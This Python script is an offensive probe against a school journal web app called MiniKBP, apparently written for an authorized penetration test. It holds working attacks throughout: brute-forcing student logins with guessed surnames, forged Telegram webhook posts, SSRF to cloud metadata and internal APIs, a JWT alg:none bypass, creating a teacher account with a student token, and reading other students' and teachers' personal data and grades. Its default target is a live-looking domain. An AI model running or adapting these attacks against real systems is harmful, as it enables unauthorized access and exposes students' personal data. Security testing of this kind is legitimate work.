#!/usr/bin/env python3
"""Offensive security probe against MiniKBP (authorized local prod-like target)."""

from __future__ import annotations

import json
import ssl
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, field

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://lk.mini-kbp.site"
TIMEOUT = 20


@dataclass
class Finding:
    severity: str
    title: str
    evidence: str
    exploitable: bool = False


findings: list[Finding] = []


def req(
    method: str,
    path: str,
    body: dict | None = None,
    token: str | None = None,
    headers: dict | None = None,
) -> tuple[int, str, dict]:
    url = BASE.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    h = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if headers:
        h.update(headers)
    request = urllib.request.Request(url, data=data, headers=h, method=method)
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT, context=ctx) as resp:
            raw = resp.read(8000).decode("utf-8", "replace")
            hdrs = dict(resp.headers)
            return resp.status, raw, hdrs
    except urllib.error.HTTPError as e:
        raw = e.read(8000).decode("utf-8", "replace")
        return e.code, raw, dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


def add(sev: str, title: str, status: int, body: str, exploitable: bool = False):
    findings.append(
        Finding(
            severity=sev,
            title=title,
            evidence=f"{status} {body[:500]}",
            exploitable=exploitable,
        )
    )


def section(name: str):
    print(f"\n=== {name} ===")


def main():
    print(f"Target: {BASE}")

    # 1. Recon
    section("RECON")
    for path in [
        "/api/public/app-config/",
        "/api/public/groups/",
        "/admin/",
        "/api/swagger/",
        "/api/docs/",
        "/.env",
        "/api/debug/",
    ]:
        st, body, hdrs = req("GET", path)
        print(f"GET {path} -> {st}")
        if st == 200 and path == "/admin/":
            add("MEDIUM", "Django admin exposed", st, body[:200])
        if st == 200 and "groups" in path:
            add("INFO", "Public group list", st, body[:200])

    st, body, hdrs = req("GET", "/api/public/app-config/")
    sec_headers = [
        "X-Frame-Options",
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
    ]
    missing = [h for h in sec_headers if h not in hdrs]
    if missing:
        add("LOW", f"Missing security headers: {', '.join(missing)}", st, str(hdrs)[:300])

    # 2. Unauthenticated access
    section("UNAUTH BYPASS")
    for path in [
        "/api/app-accounts/",
        "/api/admin/analytics/",
        "/api/student/journal/",
        "/api/teachers/",
        "/api/grades/",
        "/api/enrollments/",
    ]:
        st, body, _ = req("GET", path)
        print(f"GET {path} -> {st}")
        if st == 200:
            add("CRITICAL", f"Unauthenticated access: {path}", st, body, exploitable=True)

    # 3. Student login attack (knowledge-based)
    section("STUDENT LOGIN BRUTE")
    st_groups, groups_body, _ = req("GET", "/api/public/groups/")
    groups = json.loads(groups_body) if st_groups == 200 else []
    login_ok = False
    student_token = None
    for g in groups[:6]:
        gid = g.get("id")
        for surname in ["Тестовый", "Иванов", "Петров", "meow", "Admin"]:
            st, body, _ = req(
                "POST",
                "/api/auth/student-login/",
                {
                    "student_name": surname,
                    "group_id": gid,
                    "birth_day": "01.01.2000",
                },
            )
            if st == 200:
                login_ok = True
                data = json.loads(body)
                student_token = data.get("access")
                add(
                    "CRITICAL",
                    f"Student login success: {surname} group={gid}",
                    st,
                    body[:400],
                    exploitable=True,
                )
                print(f"  HIT: {surname} group={gid}")
                break
        if login_ok:
            break

    # 4. Push spam / anon register
    section("PUSH REGISTER")
    st, body, _ = req(
        "POST",
        "/api/push/register/",
        {
            "fcmToken": "pentest-anon-token",
            "ejGroupId": "1",
            "groupName": "Pentest",
            "deviceId": "pentest-device",
            "active": True,
        },
    )
    print(f"POST /api/push/register/ -> {st}")
    if st == 200:
        add("MEDIUM", "Anonymous push device registration", st, body, exploitable=True)

    # 5. Telegram webhook without secret
    section("TELEGRAM WEBHOOK")
    st, body, _ = req(
        "POST",
        "/api/telegram/webhook/",
        {
            "message": {
                "chat": {"id": 999999001},
                "text": "/start fakepentesttoken",
                "from": {"id": 999999001, "first_name": "Pentest"},
            }
        },
    )
    print(f"POST /api/telegram/webhook/ -> {st}")
    if st == 200:
        add("HIGH", "Telegram webhook accepts unauthenticated POST", st, body, exploitable=True)

    # 6. SSRF
    section("SSRF")
    for url in [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8000/api/app-accounts/",
        "https://kbp.by/",
    ]:
        st, body, _ = req("POST", "/api/kbp/proxy/", {"url": url, "method": "GET"})
        print(f"SSRF {url[:40]} -> {st} {body[:120]}")
        if st == 200 and "169.254" in url:
            add("CRITICAL", "SSRF to cloud metadata", st, body[:300], exploitable=True)
        if st == 200 and "127.0.0.1" in url and "app-accounts" in body:
            add("CRITICAL", "SSRF to internal API", st, body[:300], exploitable=True)

    # 7. JWT alg none
    section("JWT ABUSE")
    fake_none = (
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
        "eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwidXNlcl9pZCI6IjEifQ."
    )
    st, body, _ = req("GET", "/api/app-accounts/", token=fake_none)
    print(f"JWT alg:none -> {st}")
    if st == 200:
        add("CRITICAL", "JWT alg:none accepted", st, body, exploitable=True)

    # 8. Authenticated attacks (if student token obtained)
    if student_token:
        section("PRIVESC + IDOR (student JWT)")
        st, body, _ = req(
            "POST",
            "/api/teachers/",
            {"username": "pentest_hacker", "password": "Pentest123!", "full_name": "Pentest Hacker"},
            token=student_token,
        )
        print(f"POST /api/teachers/ as student -> {st}")
        if st in (200, 201):
            add("CRITICAL", "Student creates teacher account", st, body, exploitable=True)

        st, body, _ = req("GET", "/api/teachers/", token=student_token)
        if st == 200 and "@" in body:
            add("HIGH", "Student reads all teachers PII", st, body[:400], exploitable=True)

        st, body, _ = req("GET", "/api/students/", token=student_token)
        if st == 200:
            add("HIGH", "Student reads all students PII", st, body[:400], exploitable=True)

        st, body, _ = req("GET", "/api/enrollments/", token=student_token)
        if st == 200 and len(body) > 50:
            add("HIGH", "Student reads all enrollments", st, body[:400], exploitable=True)

        for gid in ["2", "3", "4", "5"]:
            st, body, _ = req("GET", f"/api/groups/{gid}/students/", token=student_token)
            if st == 200 and body.strip() not in ("[]", ""):
                add(
                    "HIGH",
                    f"Student reads group {gid} roster",
                    st,
                    body[:300],
                    exploitable=True,
                )

        st, body, _ = req("GET", "/api/grades/?group=2", token=student_token)
        if st == 200 and "student" in body and '"value"' in body:
            add("CRITICAL", "Student IDOR on grades (other students)", st, body[:400], exploitable=True)

        st, body, _ = req("GET", "/api/admin/analytics/", token=student_token)
        if st == 200:
            add("CRITICAL", "Student accesses admin analytics", st, body[:300], exploitable=True)

    # 9. Mobile link token enum sample
    section("MOBILE LINK")
    st, body, _ = req("POST", "/api/auth/app/mobile/link/start/", {"kind": "site"})
    if st == 200:
        tok = json.loads(body).get("token", "")
        print(f"Mobile link token issued: {tok}")
        st2, body2, _ = req("GET", f"/api/auth/app/mobile/link/poll/?token={tok}")
        print(f"Poll own token -> {st2}")

    # Report
    section("FINDINGS SUMMARY")
    by_sev = {}
    for f in findings:
        by_sev.setdefault(f.severity, []).append(f)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        items = by_sev.get(sev, [])
        if items:
            print(f"\n[{sev}] x{len(items)}")
            for it in items:
                mark = "EXPLOITED" if it.exploitable else "detected"
                print(f"  - {it.title} ({mark})")
                print(f"    {it.evidence[:200]}")

    exploitable = sum(1 for f in findings if f.exploitable)
    print(f"\nTotal findings: {len(findings)}, exploitable: {exploitable}")
    return 1 if any(f.severity == "CRITICAL" and f.exploitable for f in findings) else 0


if __name__ == "__main__":
    raise SystemExit(main())
